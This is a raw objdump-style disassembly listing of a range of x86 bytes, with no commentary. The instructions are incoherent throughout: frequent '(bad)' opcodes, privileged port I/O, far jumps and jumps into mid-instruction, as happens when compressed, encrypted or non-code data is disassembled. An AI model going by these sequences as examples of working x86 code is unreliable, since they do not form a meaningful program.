  41e32a:	inc    ebx
  41e32b:	inc    eax
  41e32c:	mov    ch,0xc
  41e32e:	in     al,0x9a
  41e330:	sbb    DWORD PTR [ebp+0x5c],ebx
  41e333:	sahf   
  41e334:	xchg   esi,eax
  41e335:	into   
  41e336:	fldcw  WORD PTR [ecx+0x2b7bee91]
  41e33c:	mov    edi,0x5214673d
  41e341:	sar    bh,1
  41e343:	addr16 js 0x41e3b6
  41e346:	aas    
  41e347:	adc    dl,BYTE PTR [ebx]
  41e349:	dec    esi
  41e34a:	lea    ebx,[edx-0x8]
  41e34d:	adc    al,0xe2
  41e34f:	aad    0xd1
  41e351:	lock fcmovnb st,st(1)
  41e354:	icebp  
  41e355:	ss mov bl,0x76
  41e358:	push   edi
  41e359:	or     BYTE PTR [eax-0x19bc4140],ah
  41e35f:	stos   BYTE PTR es:[edi],al
  41e360:	cmp    eax,DWORD PTR [ecx]
  41e362:	mov    eax,0x6fe38486
  41e367:	nop
  41e368:	popaw  
  41e36a:	shl    DWORD PTR [edi],0x1f
  41e36d:	push   edi
  41e36e:	mov    WORD PTR [esi+0x4c],cs
  41e371:	out    0xec,eax
  41e373:	mov    bl,0x1b
  41e375:	fild   WORD PTR [ebx-0x63]
  41e378:	mul    esi
  41e37a:	or     eax,0x4fc0b0df
  41e37f:	lds    esi,FWORD PTR [esp+eiz*4+0x47819cb0]
  41e386:	jmp    0x41e374
  41e388:	call   0x5deb:0x5d09f096
  41e38f:	push   edx
  41e390:	xor    BYTE PTR [esp+esi*8+0x799d811f],cl
  41e397:	and    BYTE PTR [ebx-0x305fc5f6],0x7d
  41e39e:	inc    esi
  41e39f:	add    ah,al
  41e3a1:	enter  0x35de,0x3c
  41e3a5:	mov    bh,0x7
  41e3a7:	mov    ?,WORD PTR [ebx]
  41e3a9:	pop    ss
  41e3aa:	push   ss
  41e3ab:	jmp    0x41e377
  41e3ad:	add    al,0xd8
  41e3af:	test   DWORD PTR [ebp+0x40],ebp
  41e3b2:	jo     0x41e3de
  41e3b4:	lods   eax,DWORD PTR ds:[esi]
  41e3b6:	cwde   
  41e3b7:	mov    edi,0x8116393c
  41e3bc:	mov    esp,0x5b92bf71
  41e3c1:	test   BYTE PTR [ecx-0x33ba1f7f],bh
  41e3c7:	cmp    esp,DWORD PTR [ebx+esi*1+0x280b840d]
  41e3ce:	daa    
  41e3cf:	iret   
  41e3d0:	dec    ebx
  41e3d1:	loope  0x41e37c
  41e3d3:	jo     0x41e3de
  41e3d5:	xchg   ecx,eax
  41e3d6:	pop    ecx
  41e3d7:	mov    al,es:0x4aa0eac8
  41e3dd:	jg     0x41e377
  41e3df:	fcom   DWORD PTR [ebp-0x230dd9c]
  41e3e5:	ja     0x41e3de
  41e3e7:	add    dl,BYTE PTR [esi+eax*8+0x7ffe7e63]
  41e3ee:	cwde   
  41e3ef:	test   DWORD PTR [esi-0x35306746],0xe3715277
  41e3f9:	loope  0x41e385
  41e3fb:	and    eax,0x1643afd6
  41e400:	jo     0x41e39b
  41e402:	mov    DWORD PTR [ecx+0x386d8c90],edx
  41e408:	(bad)  
  41e409:	cmp    eax,0xf8771ec5
  41e40e:	ins    DWORD PTR es:[edi],dx
  41e40f:	fs jae 0x41e3e9
  41e412:	ret    
  41e413:	inc    ecx
  41e414:	lods   al,BYTE PTR ds:[esi]
  41e415:	cwde   
  41e416:	or     al,0x3f
  41e418:	and    edx,edi
  41e41a:	rcr    DWORD PTR [ebx-0x12],1
  41e41d:	ret    
  41e41e:	mov    ah,BYTE PTR [eax-0x46e532d1]
  41e424:	js     0x41e46c
  41e426:	sbb    ch,BYTE PTR [edi]
  41e428:	jo     0x41e435
  41e42a:	push   0xffffff82
  41e42c:	js     0x41e3d9
  41e42e:	hlt    
  41e42f:	push   ebx
  41e430:	fldcw  WORD PTR [esi+esi*1+0x4a76bee7]
  41e437:	std    
  41e438:	lahf   
  41e439:	ret    
  41e43a:	std    
  41e43b:	daa    
  41e43c:	les    ebp,FWORD PTR [ebx]
  41e43e:	inc    esi
  41e43f:	add    DWORD PTR [esi+edx*2-0x20],ecx
  41e443:	jb     0x41e407
  41e445:	fisub  DWORD PTR [esi-0x26]
  41e448:	sub    eax,0x4880419a
  41e44d:	out    dx,al
  41e44e:	mov    bh,0x9e
  41e450:	xchg   ecx,eax
  41e451:	add    dh,al
  41e453:	ret    
  41e454:	sbb    dh,BYTE PTR [esi+0x7a34f0b2]
  41e45a:	mov    bl,0x34
  41e45c:	xlat   BYTE PTR ds:[ebx]
  41e45d:	add    al,BYTE PTR [edx]
  41e45f:	mov    edx,es
  41e461:	cdq    
  41e462:	ficomp DWORD PTR [esi]
  41e464:	cwde   
  41e465:	enter  0x8015,0x41
  41e469:	push   ss
  41e46a:	stc    
  41e46b:	dec    ebp
  41e46c:	test   eax,0x887fd058
  41e471:	addr16 mov al,ds:0x80f0
  41e475:	jae    0x41e45b
  41e477:	inc    edx
  41e478:	mov    ebp,0xe59e0e58
  41e47d:	xchg   ecx,eax
  41e47e:	scas   eax,DWORD PTR es:[edi]
  41e47f:	lea    esi,[edi+0x33]
  41e482:	mov    al,0x16
  41e484:	mov    ds:0x168086d1,eax
  41e489:	jcxz   0x41e4fe
  41e48c:	in     eax,dx
  41e48d:	inc    ebx
  41e48e:	gs sub al,0x40
  41e491:	sub    eax,0x5a6c814a
  41e496:	push   edx
  41e497:	inc    ecx
  41e498:	shl    BYTE PTR [edi+0x67],0x14
  41e49c:	adc    DWORD PTR [ebx+0x58],esp
  41e49f:	(bad)  
  41e4a0:	cli    
  41e4a1:	stos   BYTE PTR es:[edi],al
  41e4a2:	or     eax,0x862414f2
  41e4a7:	dec    ebx
  41e4a8:	(bad)  
  41e4a9:	mov    DWORD PTR [edi],0xcf1fc7dc
  41e4af:	add    al,0x82
  41e4b1:	pop    ds
  41e4b2:	lds    esp,FWORD PTR [ebp+0x10c0433]
  41e4b8:	add    eax,0xa7f9b6e4
  41e4bd:	cld    
  41e4be:	scas   al,BYTE PTR es:[edi]
  41e4bf:	clc    
  41e4c0:	adc    eax,0x925344e3
  41e4c5:	pop    es
  41e4c6:	out    dx,al
  41e4c7:	or     DWORD PTR [ecx],ebp
  41e4c9:	pop    esi
  41e4ca:	xor    DWORD PTR ds:0xac4f0027,eax
  41e4d0:	xchg   edx,eax
  41e4d1:	xchg   esi,eax
  41e4d2:	ins    DWORD PTR es:[edi],dx
  41e4d3:	int3   
  41e4d4:	loop   0x41e4eb
  41e4d6:	and    al,0x4d
  41e4d8:	outs   dx,BYTE PTR ds:[esi]
  41e4d9:	sub    eax,0xe5f82135
  41e4de:	jge    0x41e467
  41e4e0:	je     0x41e4b5
  41e4e2:	dec    esp
  41e4e3:	scas   al,BYTE PTR es:[edi]
  41e4e4:	adc    DWORD PTR ds:0x47b7fb35,ebp
  41e4ea:	(bad)  
  41e4eb:	(bad)  
  41e4ec:	mov    dh,0x4d
  41e4ee:	lahf   
  41e4ef:	pop    ebp
  41e4f0:	mov    bh,0x17
  41e4f2:	adc    eax,0xcc2a220b
  41e4f7:	add    BYTE PTR [ebp+0x2375b169],al
  41e4fd:	pop    ss
  41e4fe:	cmp    cl,al
  41e500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e501:	mov    ecx,0xfb1ac1be
  41e506:	push   ds
  41e507:	sar    BYTE PTR [edi-0x56009ec8],0x31
  41e50e:	ds jae 0x41e547
  41e511:	gs stos DWORD PTR es:[edi],eax
  41e513:	pop    ebx
  41e514:	push   edi
  41e515:	add    bl,al
  41e517:	jle    0x41e581
  41e519:	dec    eax
  41e51a:	mov    ecx,0x18ab6fe
  41e51f:	sub    DWORD PTR [ebx+0x2e],ebp
  41e522:	es mov ebp,0x4350d48b
  41e528:	cmp    esi,DWORD PTR [eax]
  41e52a:	rcl    DWORD PTR [eax],1
  41e52c:	xchg   ebp,eax
  41e52d:	add    eax,DWORD PTR [ebx-0x61]
  41e530:	xor    edi,DWORD PTR [esi]
  41e532:	iret   
  41e533:	xchg   edi,eax
  41e534:	jb     0x41e4f6
  41e536:	ficom  WORD PTR ds:0x16f5a3ad
  41e53c:	add    BYTE PTR [edx+0x60adfbd4],bh
  41e542:	dec    ecx
  41e543:	out    0xd1,eax
  41e545:	lahf   
  41e546:	add    eax,0xd5f98b47
  41e54b:	xor    BYTE PTR [ebx+0x28],bl
  41e54e:	mov    cl,0x38
  41e550:	mov    ebx,0xe3d302e9
  41e555:	mov    ss,WORD PTR ds:0x7d5c7043
  41e55b:	sbb    ch,BYTE PTR [edi+0x2c0d16d8]
  41e561:	aas    
  41e562:	push   0xffffffc4
  41e564:	(bad)  
  41e565:	jno    0x41e50f
  41e567:	bound  esp,QWORD PTR [ebx+0x75]
  41e56a:	adc    DWORD PTR [esi-0x3d],esi
  41e56d:	mov    ecx,0x4c446971
  41e572:	les    ecx,FWORD PTR [edi+ebp*2+0x4c]
  41e576:	fs dec ebx
  41e578:	mov    cl,0xca
  41e57a:	jmp    0xd40:0x10b98e4d
  41e581:	jo     0x41e602
  41e583:	sub    eax,0xed8b3778
  41e588:	rcl    DWORD PTR [ebp+0x59],cl
  41e58b:	(bad)  
  41e58c:	fsub   DWORD PTR [ecx+0x1a]
  41e58f:	pushf  
  41e590:	ins    DWORD PTR es:[edi],dx
  41e591:	imul   eax,DWORD PTR [esi+0x575074ab]
  41e598:	jns    0x41e60e
  41e59a:	jmp    0x41e5d9
  41e59c:	or     BYTE PTR [esi+0x26],ch
  41e59f:	jbe    0x41e536
  41e5a1:	and    al,BYTE PTR [edi+edi*1-0xee08e6]
  41e5a8:	mov    fs,WORD PTR [ebp+0x5cf48bf7]
  41e5ae:	jg     0x41e58b
  41e5b0:	xor    al,0xc3
  41e5b2:	mov    edi,0x47d0b95f
  41e5b7:	mov    eax,0xf620c7f9
  41e5bc:	push   edi
  41e5bd:	lds    edx,FWORD PTR [edi+0x4402e2b0]
  41e5c3:	repnz pop edi
  41e5c5:	push   0xe02d833d
  41e5ca:	in     al,0xc2
  41e5cc:	sub    al,0xe8
  41e5ce:	pop    edx
  41e5cf:	pushf  
  41e5d0:	jbe    0x41e5d9
  41e5d2:	mov    ecx,DWORD PTR [edx]
  41e5d4:	int    0x65
  41e5d6:	(bad)  
  41e5d7:	mov    al,ds:0x7310238d
  41e5dc:	pop    ss
  41e5dd:	fld    st(6)
  41e5df:	add    al,0xb1
  41e5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5e2:	dec    esi
  41e5e3:	cwde   
  41e5e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5e5:	retf   
  41e5e6:	xor    ah,BYTE PTR [eax-0x1]
  41e5e9:	cld    
  41e5ea:	inc    edx
  41e5eb:	add    dl,BYTE PTR [esi+0x2173b513]
  41e5f1:	bound  ebx,QWORD PTR [edx]
  41e5f3:	and    eax,0x85a8f27a
  41e5f8:	mov    dh,0xab
  41e5fa:	test   BYTE PTR [esi],al
  41e5fc:	pop    esi
  41e5fd:	iret   
  41e5fe:	xor    ch,BYTE PTR [ecx-0x7c]
  41e601:	sti    
  41e602:	shl    BYTE PTR [edx],cl
  41e604:	jo     0x41e669
  41e606:	popa   
  41e607:	xchg   esp,eax
  41e608:	cs inc ecx
  41e60a:	daa    
  41e60b:	mov    WORD PTR [eax],gs
  41e60d:	add    eax,0x427ab051
  41e612:	aaa    
  41e613:	inc    eax
  41e614:	xchg   ebp,eax
  41e615:	iret   
  41e616:	ret    0x965b
  41e619:	mov    eax,ds:0x9bbedbb8
  41e61e:	dec    eax
  41e61f:	and    al,0x14
  41e621:	jb     0x41e5dc
  41e623:	loop   0x41e5af
  41e625:	xchg   edx,eax
  41e626:	jae    0x41e65d
  41e628:	mov    esp,0x261a88d3
  41e62d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e62e:	push   ds
  41e62f:	adc    bh,BYTE PTR [edx-0x3d]
  41e632:	xchg   edi,eax
  41e633:	(bad)  
  41e634:	mov    ds:0xc4ca9965,eax
  41e639:	outs   dx,DWORD PTR ds:[esi]
  41e63a:	jle    0x41e5d2
  41e63c:	xor    BYTE PTR ds:0x28acd934,bl
  41e642:	pop    esi
  41e643:	dec    ebx
  41e644:	lds    eax,FWORD PTR [ebx]
  41e646:	hlt    
  41e647:	mov    ecx,0xb6cdbfe1
  41e64c:	ins    DWORD PTR es:[edi],dx
  41e64d:	and    eax,0x558bc75e
  41e652:	mov    WORD PTR [ecx-0x7a],ss
  41e655:	add    ecx,DWORD PTR [eax+0x31]
  41e658:	ficomp DWORD PTR [esp+ecx*2]
  41e65b:	loope  0x41e67d
  41e65d:	pop    ecx
  41e65e:	and    DWORD PTR ds:0x17d7af27,ebx
  41e664:	adc    BYTE PTR [esi],al
  41e666:	mov    cl,0x5e
  41e668:	fidiv  DWORD PTR [edx]
  41e66a:	ret    
  41e66b:	ja     0x41e657
  41e66d:	inc    eax
  41e66e:	ja     0x41e6ad
  41e670:	pop    ecx
  41e671:	fdivp  st(2),st
  41e673:	ds (bad) 
  41e675:	mov    ch,BYTE PTR [edx+0x402f00cd]
  41e67b:	cmp    BYTE PTR [eax-0x7c],dl
  41e67e:	cmc    
  41e67f:	push   esp
  41e680:	bts    DWORD PTR [edi-0x28],ecx
  41e684:	imul   edx,eax,0xffffff9e
  41e687:	sub    BYTE PTR [ebp-0x76484267],al
  41e68d:	div    BYTE PTR [ecx]
  41e68f:	cmp    BYTE PTR [edx],0x6a
  41e692:	push   edx
  41e693:	push   esp
  41e694:	push   esp
  41e695:	inc    dl
  41e697:	sti    
  41e698:	mov    ch,0x28
  41e69a:	mov    BYTE PTR [esi],0x8d
  41e69d:	pop    esi
  41e69e:	imul   DWORD PTR [ebx]
  41e6a0:	add    al,BYTE PTR ds:0x168db948
  41e6a6:	(bad)  
  41e6a8:	mov    bh,0x1b
  41e6aa:	aad    0x7
  41e6ac:	popa   
  41e6ad:	or     DWORD PTR [ebx],ecx
  41e6af:	or     esi,DWORD PTR [edx-0x7c8450c0]
  41e6b5:	sub    eax,0x486dd66e
  41e6ba:	repz add BYTE PTR [edx-0x5c],dh
  41e6be:	inc    ebx
  41e6bf:	es mov esp,0xba362dd
  41e6c5:	jns    0x41e67a
  41e6c7:	sub    bl,BYTE PTR [ecx-0x6286a956]
  41e6cd:	pop    es
  41e6ce:	dec    ebp
  41e6cf:	pop    eax
  41e6d0:	lea    esi,[edi-0x7476f629]
  41e6d6:	call   FWORD PTR [eax]
  41e6d8:	sub    ebx,DWORD PTR [eax+0xf]
  41e6db:	xlat   BYTE PTR ds:[ebx]
  41e6dc:	fucomp st(5)
  41e6de:	jbe    0x41e736
  41e6e0:	jg     0x41e720
  41e6e2:	mov    WORD PTR ds:0x80cb3f8f,?
  41e6e8:	inc    ecx
  41e6e9:	ja     0x41e68a
  41e6eb:	sub    eax,0xd0845712
  41e6f0:	stos   BYTE PTR es:[edi],al
  41e6f1:	shr    DWORD PTR [esi],cl
  41e6f3:	je     0x41e719
  41e6f5:	mov    dh,0x1a
  41e6f7:	push   es
  41e6f8:	shl    ebx,0xfa
  41e6fb:	and    eax,0x81fb6587
  41e700:	adc    BYTE PTR [edx-0xa5fd2cf],dl
  41e706:	dec    bl
  41e708:	lea    esi,[esi-0x35]
  41e70b:	into   
  41e70c:	cli    
  41e70d:	sub    BYTE PTR [eax+0x10110e4e],bl
  41e713:	xchg   ebx,eax
  41e714:	ficom  DWORD PTR [edi+0x10c82641]
  41e71a:	in     eax,0xe0
  41e71c:	out    dx,eax
  41e71d:	bound  ebp,QWORD PTR [ecx]
  41e71f:	inc    esp
  41e720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e721:	xlat   BYTE PTR ds:[ebx]
  41e722:	push   0x59e6df41
  41e727:	pushf  
  41e728:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41e72a:	repz push ss
  41e72c:	push   0x30
  41e72e:	imul   eax,DWORD PTR [ecx-0x32],0xffffffd4
  41e732:	int    0xea
  41e734:	std    
  41e735:	jp     0x41e755
  41e737:	mov    ebp,DWORD PTR [eax-0x28]
  41e73a:	cmovp  esi,ecx
  41e73d:	fwait
  41e73e:	cmp    ah,BYTE PTR [ebp+0x52c927a8]
  41e744:	(bad)  
  41e745:	(bad)  
  41e746:	jb     0x41e73b
  41e748:	js     0x41e756
  41e74a:	jge    0x41e6f4
  41e74c:	pop    edi
  41e74d:	and    cl,BYTE PTR [ebx-0x69497d59]
  41e753:	js     0x41e7ce
  41e755:	inc    edi
  41e756:	push   edx
  41e757:	scas   eax,DWORD PTR es:[edi]
  41e758:	ret    0x845f
  41e75b:	ins    BYTE PTR es:[edi],dx
  41e75c:	push   0x55fe0ac4
  41e761:	jecxz  0x41e6fe
  41e763:	xchg   esp,eax
  41e764:	sbb    dh,bh
  41e766:	xlat   BYTE PTR ds:[ebx]
  41e767:	xor    ch,BYTE PTR [ebx+0x4]
  41e76a:	es sbb DWORD PTR cs:[ebx],esi
  41e76e:	jo     0x41e730
  41e770:	lahf   
  41e771:	and    BYTE PTR ds:0x4980d4d5,0xb6
  41e778:	cmp    cl,0x11
  41e77b:	cmp    DWORD PTR [ebx+0x7c],edi
  41e77e:	rcr    DWORD PTR [edi+0x5946fc3a],1
  41e784:	fcmovu st,st(0)
  41e786:	daa    
  41e787:	sar    DWORD PTR [eax-0x19],1
  41e78a:	sahf   
  41e78b:	rol    DWORD PTR [ecx+0x16],0xd
  41e78f:	call   0x3c608d54
  41e794:	(bad)  
  41e795:	fwait
  41e796:	sbb    eax,0x5ab029
  41e79b:	xor    edx,DWORD PTR [ebx-0x6f]
  41e79e:	add    BYTE PTR [ebx-0x5e],cl
  41e7a1:	(bad)  
  41e7a2:	repz dec ebx
  41e7a4:	and    eax,0x81d2bf04
  41e7a9:	mov    DWORD PTR [ecx],ebx
  41e7ab:	push   edi
  41e7ac:	push   0xffffff8c
  41e7ae:	mov    esp,0x59fe1a38
  41e7b3:	push   es
  41e7b4:	jb     0x41e797
  41e7b6:	icebp  
  41e7b7:	scas   eax,DWORD PTR es:[edi]
  41e7b8:	push   eax
  41e7b9:	cmc    
  41e7ba:	lods   al,BYTE PTR ds:[esi]
  41e7bb:	fwait
  41e7bc:	xchg   DWORD PTR [ecx+eiz*4],edx
  41e7bf:	call   0x8712f9bf
  41e7c4:	sbb    al,0x31
  41e7c6:	fild   DWORD PTR [esi]
  41e7c8:	in     eax,dx
  41e7c9:	pop    edi
  41e7ca:	mov    al,ds:0x62b60381
  41e7cf:	mov    eax,0x942f32e3
  41e7d4:	aas    
  41e7d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7d6:	mov    bl,0xfe
  41e7d8:	mov    al,ds:0x3c80d109
  41e7dd:	adc    DWORD PTR fs:[ecx-0x59f069c0],0xffffffbb
  41e7e5:	cdq    
  41e7e6:	retf   
  41e7e7:	sub    dh,dh
  41e7e9:	or     eax,0xd2651220
  41e7ee:	dec    esi
  41e7ef:	arpl   bx,dx
  41e7f1:	sbb    al,0xd3
  41e7f3:	cli    
  41e7f4:	cmc    
  41e7f5:	ja     0x41e7e8
  41e7f7:	mov    eax,ds:0xeb7a8105
  41e7fc:	fisttp DWORD PTR ds:0x838062c5
  41e802:	test   al,0x0
  41e804:	cmp    BYTE PTR [eax+0x21488120],bl
  41e80a:	aaa    
  41e80b:	and    ebp,DWORD PTR [esi+0x31]
  41e80e:	pop    esp
  41e80f:	pop    ebp
  41e810:	outs   dx,BYTE PTR ds:[esi]
  41e811:	xchg   esi,eax
  41e812:	fmul   DWORD PTR [ebp+0x1b]
  41e815:	sub    eax,0xe16349a7
  41e81a:	sbb    ebx,DWORD PTR [edx+0x72]
  41e81d:	pop    esp
  41e81e:	int3   
  41e81f:	push   ebx
  41e820:	sub    bl,0x6f
  41e823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e824:	scas   eax,DWORD PTR es:[edi]
  41e825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e826:	jne    0x41e846
  41e828:	or     eax,0x61e8fbc8
  41e82d:	test   DWORD PTR [ecx+0x71],0x124ba407
  41e834:	mov    cl,0x3a
  41e836:	push   esi
  41e837:	sbb    BYTE PTR [ebx-0x7adb346e],dh
  41e83d:	add    DWORD PTR [edx],ebx
  41e83f:	imul   DWORD PTR [esi+0x1454270f]
  41e845:	jg     0x41e8c0
  41e847:	sub    eax,0xddf9606a
  41e84c:	mov    ah,BYTE PTR ds:0xd67a799
  41e852:	scas   al,BYTE PTR es:[edi]
  41e853:	sub    DWORD PTR [esi],edi
  41e855:	popa   
  41e856:	stc    
  41e857:	adc    eax,0x1d1ba475
  41e85c:	inc    ebx
  41e85d:	dec    ebx
  41e85e:	jle    0x41e7e6
  41e860:	nop
  41e861:	mov    dl,0xa5
  41e863:	das    
  41e864:	fld    QWORD PTR [edx-0x29]
  41e867:	jmp    0x20ef4383
  41e86c:	pop    ebx
  41e86d:	jg     0x41e818
  41e86f:	ret    
  41e870:	mov    ebx,0xccc6b334
  41e875:	sub    BYTE PTR [esi-0x4a223b1e],ah
  41e87b:	test   ah,0x8b
  41e87e:	ja     0x41e8e0
  41e880:	adc    eax,0x523a078f
  41e885:	add    BYTE PTR [edi-0x37276c6a],0x75
  41e88c:	loop   0x41e879
  41e88e:	dec    edi
  41e88f:	or     BYTE PTR [esi-0x1cb37077],0x22
  41e896:	and    al,0x85
  41e898:	ss mov ecx,0x150574af
  41e89e:	xlat   BYTE PTR ds:[ebx]
  41e89f:	gs sti 
  41e8a1:	cmp    ebp,ecx
  41e8a3:	ins    DWORD PTR es:[edi],dx
  41e8a4:	(bad)  
  41e8a5:	sbb    eax,0xd33b45df
  41e8aa:	pop    es
  41e8ab:	sub    edi,DWORD PTR ds:[ebp-0x7cec1262]
  41e8b2:	arpl   WORD PTR [edi],di
  41e8b4:	push   0x6c
  41e8b6:	imul   eax,DWORD PTR [eax+0x37],0x21
  41e8ba:	fcmovb st,st(2)
  41e8bc:	push   esi
  41e8bd:	sub    ebp,edi
  41e8bf:	jecxz  0x41e8bd
  41e8c1:	xor    al,0xcf
  41e8c3:	mov    BYTE PTR [ebp+0x7c],al
  41e8c6:	and    ebx,DWORD PTR [ecx]
  41e8c8:	pop    edi
  41e8c9:	inc    ebx
  41e8ca:	jl     0x712980a1
  41e8d0:	aas    
  41e8d1:	mov    DWORD PTR [ecx],ecx
  41e8d3:	push   edx
  41e8d4:	(bad)  [eax]
  41e8d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8d7:	xor    eax,DWORD PTR [esi+0x3e]
  41e8da:	inc    esi
  41e8db:	and    bh,0x9f
  41e8de:	mov    dl,BYTE PTR ds:0x7ade2ee9
  41e8e4:	inc    ecx
  41e8e5:	inc    ecx
  41e8e6:	ror    DWORD PTR [ecx-0x3f81ad50],1
  41e8ec:	cmp    eax,0xa300fdeb
  41e8f1:	adc    edi,ecx
  41e8f3:	mov    edx,0xec5777d1
  41e8f8:	cld    
  41e8f9:	xchg   esp,eax
  41e8fa:	or     eax,0xd60cef33
  41e8ff:	sub    esp,ebx
  41e901:	mov    al,0x5b
  41e903:	out    0x86,eax
  41e905:	sbb    ebx,0x4793f21
  41e90b:	(bad)  
  41e90c:	ins    BYTE PTR es:[edi],dx
  41e90d:	mov    ebp,0x748849bd
  41e912:	and    al,ch
  41e914:	outs   dx,DWORD PTR ds:[esi]
  41e915:	dec    BYTE PTR [ecx+edi*4+0x1e]
  41e919:	cmp    DWORD PTR [eax-0x77fd37fb],esi
  41e91f:	and    BYTE PTR [esi+0x40b29c01],0x80
  41e926:	out    0xc5,al
  41e928:	pop    edi
  41e929:	cdq    
  41e92a:	lahf   
  41e92b:	add    DWORD PTR [ebx+0x584e3191],eax
  41e931:	push   esi
  41e932:	cmc    
  41e933:	out    dx,al
  41e934:	mov    ch,0xd8
  41e936:	inc    ebx
  41e937:	fwait
  41e938:	cwde   
  41e939:	push   edi
  41e93a:	popa   
  41e93b:	jge    0x41e92b
  41e93d:	pushf  
  41e93e:	mov    edi,0x5e583c5c
  41e943:	ret    0xdd18
  41e946:	rcl    BYTE PTR [edi],1
  41e948:	outs   dx,BYTE PTR ds:[esi]
  41e949:	push   eax
  41e94a:	pop    edx
  41e94b:	push   eax
  41e94c:	iret   
  41e94d:	test   BYTE PTR [edi-0x741ad458],0xeb
  41e954:	dec    ebp
  41e955:	fdivr  QWORD PTR [edx]
  41e957:	into   
  41e958:	or     DWORD PTR [esp+ebp*2],0xffffffdb
  41e95c:	imul   esi,DWORD PTR [ebx],0x76
  41e95f:	inc    BYTE PTR [eax]
  41e961:	xchg   esi,eax
  41e962:	mov    dh,BYTE PTR [ecx-0x24]
  41e965:	js     0x41e92c
  41e967:	iret   
  41e968:	bound  ebp,QWORD PTR [edi]
  41e96a:	jecxz  0x41e94b
  41e96c:	adc    eax,0xe7b6b456
  41e971:	mov    eax,0x131ec66c
  41e976:	je     0x41e9c4
  41e978:	enter  0xc29b,0x8c
  41e97c:	xchg   BYTE PTR ds:0x2d4e7b47,ah
  41e982:	push   ebp
  41e983:	in     al,dx
  41e984:	dec    edx
  41e985:	call   0x95c33b89
  41e98a:	and    DWORD PTR [ebp+0x7],ebx
  41e98d:	ja     0x41e914
  41e98f:	pop    edi
  41e990:	push   ss
  41e991:	cdq    
  41e992:	sub    al,0xb3
  41e994:	or     al,BYTE PTR [eax]
  41e996:	jmp    FWORD PTR [esi-0x19]
  41e999:	mov    eax,ds:0xd95ab3a0
  41e99e:	dec    ecx
  41e99f:	sub    ch,BYTE PTR [eax-0x47]
  41e9a2:	or     al,0x50
  41e9a4:	pop    ss
  41e9a5:	jbe    0x41e9bf
  41e9a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9a8:	dec    eax
  41e9a9:	inc    esi
  41e9aa:	jle    0x41e9bd
  41e9ac:	dec    ebp
  41e9ad:	sbb    cl,BYTE PTR [edi+edi*8+0x36646be7]
  41e9b4:	push   edi
  41e9b5:	ss dec ebx
  41e9b7:	mov    esp,0x7fe968b
  41e9bc:	or     eax,0xca213d18
  41e9c1:	daa    
  41e9c2:	shl    BYTE PTR [ebx+ebp*4-0x44],cl
  41e9c6:	in     al,0xaa
  41e9c8:	std    
  41e9c9:	sbb    dh,BYTE PTR [edx+0x59d160e5]
  41e9cf:	sub    DWORD PTR [edx+ebp*4],esp
  41e9d2:	ss gs pop ebx
  41e9d5:	gs mov dl,0x5
  41e9d8:	imul   BYTE PTR [ecx-0x76e1459]
  41e9de:	mov    bl,0x5
  41e9e0:	add    eax,0x480cfa03
  41e9e5:	ja     0x41e9e8
  41e9e7:	jle    0x41e9b1
  41e9e9:	imul   ebx,ebx,0x31
  41e9ec:	icebp  
  41e9ed:	loopne 0x41ea18
  41e9ef:	pop    ebp
  41e9f0:	daa    
  41e9f1:	add    esp,edx
  41e9f3:	call   0x834:0x6ae1d59e
  41e9fa:	mov    ebx,0x7f13af5d
  41e9ff:	imul   esp,ebx,0x3c
  41ea02:	retf   0xfabe
  41ea05:	imul   eax,DWORD PTR [edx-0x66],0xffffff85
  41ea09:	pop    edx
  41ea0a:	stos   BYTE PTR es:[edi],al
  41ea0b:	jb     0x41e995
  41ea0d:	dec    edi
  41ea0e:	push   0x1
  41ea10:	(bad)  
  41ea11:	cmp    eax,0x2f31b51d
  41ea16:	pop    ecx
  41ea17:	mov    ah,BYTE PTR gs:[eax+0x49]
  41ea1b:	jmp    0x5b07:0xf6608053
  41ea22:	xor    BYTE PTR [esp+eax*8-0x2ea2c54f],dh
  41ea29:	arpl   WORD PTR [edx-0x742111cd],si
  41ea2f:	adc    esp,DWORD PTR [esi-0x55]
  41ea32:	bnd je 0x41ea98
  41ea35:	xchg   esi,eax
  41ea36:	into   
  41ea37:	adc    al,0x1e
  41ea39:	ds je  0x41ea85
  41ea3c:	rcl    BYTE PTR [eax-0x76],0xc2
  41ea40:	div    DWORD PTR ss:[esi+0x6ced7bff]
  41ea47:	mov    edx,0x3e428fd9
  41ea4c:	dec    edx
  41ea4d:	sbb    al,0x64
  41ea4f:	pop    esp
  41ea50:	xchg   esp,eax
  41ea51:	pushf  
  41ea52:	popf   
  41ea53:	push   ecx
  41ea54:	loope  0x41ea79
  41ea56:	mov    ds:0xff441e2c,eax
  41ea5b:	arpl   WORD PTR [ebp+0x7f],dx
  41ea5e:	cld    
  41ea5f:	mov    BYTE PTR [ebx-0xc0ef60d],bh
  41ea65:	inc    eax
  41ea66:	and    BYTE PTR [edx],0x37
  41ea69:	jb     0x41ea6a
  41ea6b:	shl    DWORD PTR [eax],1
  41ea6d:	lahf   
  41ea6e:	pop    ebp
  41ea6f:	xlat   BYTE PTR ds:[ebx]
  41ea70:	mov    ch,BYTE PTR [edi+edx*8+0xe515a31]
  41ea77:	add    bh,al
  41ea79:	sbb    BYTE PTR [ecx-0x41],dl
  41ea7c:	sub    ah,BYTE PTR [edi+0x24]
  41ea7f:	xor    dl,cl
  41ea81:	pop    esi
  41ea82:	push   esi
  41ea83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea84:	mov    esi,0x5993aaff
  41ea89:	xor    ah,BYTE PTR ds:0x6d7b8de4
  41ea8f:	push   ebp
  41ea90:	int3   
  41ea91:	and    bl,BYTE PTR ds:0xdb569b76
  41ea97:	icebp  
  41ea98:	dec    ebx
  41ea99:	xor    eax,0x4d27ac0f
  41ea9e:	shl    eax,1
  41eaa0:	out    dx,eax
  41eaa1:	pushf  
  41eaa2:	jl     0x41ead1
  41eaa4:	das    
  41eaa5:	std    
  41eaa6:	cmp    eax,0x4b68c547
  41eaab:	jno    0x41ea48
